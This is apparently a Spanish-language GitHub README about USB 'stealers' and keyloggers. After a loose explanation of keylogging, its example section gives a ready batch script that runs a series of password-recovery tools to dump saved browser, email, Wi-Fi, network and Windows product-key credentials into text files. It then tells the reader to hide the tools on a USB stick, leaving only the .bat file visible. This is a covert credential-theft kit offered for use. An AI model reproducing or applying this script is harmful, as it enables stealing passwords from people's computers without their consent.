
 # USB Para extraer contraseñas de un ordenador
 
La tecnología ha avanzado tanto, que se ha desarrollado una forma de robar o registrar información de una manera disimulada en cualquier ordenador. Este método es llamado keylogging, y puede ser beneficioso o malicioso según sea el uso que se le de, ya que si eres de los que descargan programas o introducen en el ordenador dispositivos USB constantemente puedes que seas víctima de esto.

Existen personas que usan este método de forma beneficiosa. Por ejemplo, las empresas usan los keylogger para registrar y ver el avance del trabajo de sus empleados, sin necesidad de estar constantemente pidiendo informes. Esta es una manera de organizarse y optimizar al máximo las labores de oficina. Sin embargo, es un tema tan delicado que solo puede hacerse con el consentimiento del empleado y con ciertas limitaciones para proteger información personal del mismo. 

<img align="center" height="480" width="1000" alt="GIF" src="https://github.com/ArisGuimera/ArisGuimera/assets/114537444/6d78f6c0-fe7c-40e1-9b0f-dc90c309c956"/>

## 💡 ¿Qué y para qué sirve un USB Keylogger “roba datos” o los llamados “Stealers” de información?
Un keylogger también es conocido como un captador de pulsaciones de teclas o un roba datos. Este es un programa o que se encarga de guardar o registrar todo lo que escribes al utilizar el teclado. Todo lo que recopila inmediatamente lo guarda en un fichero, o también se puede programar para que la información se envíe por internet a algún correo electrónico diariamente o semanal de manera automática.

Hay dos formas para poder hacer esto. La primera es el keylogger software (el más usado), que forman parte de malware como los troyanos o rootkits. Este puede ser enviado por un correo o por cualquier otro archivo descargado del internet. El segundo es el keylogger hardware (el cual no es muy habitual), que consiste en infectar con el programa un disco extraible USB e introducirlo en el ordenador el que se deseen extraer los datos.

No esta demás decir, que no siempre un keylogger puede ser una malware, perjudicial para tu PC, ya que hay algunas empresas que ofrecen este tipo de servicios para que el cliente tenga cierto control de sus ordenadores cuando es utilizado por otros, y también es muy usado por los padres para monitorear lo que hacen sus hijos.

<img align="center" height="524" width="1000" alt="GIF" src="https://github.com/ArisGuimera/ArisGuimera/assets/114537444/cae4f52a-29ce-4d41-af99-e88315468fe8"/>

## 📚 Ejemplo

En este ejemplo, podrás extraer las contraseñas almacenadas en los navegadores web, también extraerás todas las contraseñas de internet, correos, y la key del sistema operativo. Primero tendrás que descargar este repositorio, o sino, descargar solo los programas que te interesan y luego haces lo siguiente:

Abres un bloc de notas y pegas este codigo, dependiendo que programas quieres ejecutar y lo guardas como archivo .bat

```bash
start mspass.exe /stext mspass.txt
start mailpv.exe /stext mailpv.txt
start iepv.exe /stext iepv.txt
start pspv.exe /stext pspv.txt
start PasswordFox.exe /stext passwordfox.txt
start OperaPassView.exe /stext OperaPassView.txt
start ChromePass.exe /stext ChromePass.txt
start Dialupass.exe /stext Dialupass.txt
start netpass.exe /stext netpass.txt
start WirelessKeyView.exe /stext WirelessKeyView.txt
start BulletsPassView.exe /stext BulletsPassView.txt
start VNCPassView.exe /stext VNCPassView.txt
start OpenedFilesView.exe /stext OpenedFilesView.txt
start ProduKey.exe /stext ProduKey.txt
start USBDeview.exe /stext USBDeview.txt
```

Por ultimo solo copia los archivos descagados y ocultalos en alguna usb, solo dejando el .Bat

## 📚 Nota Importante
Algo a destacar es que todos los archivos deben estar en una misma carpeta, incluyendo el ".Bat" De lo contrario no funcionará.
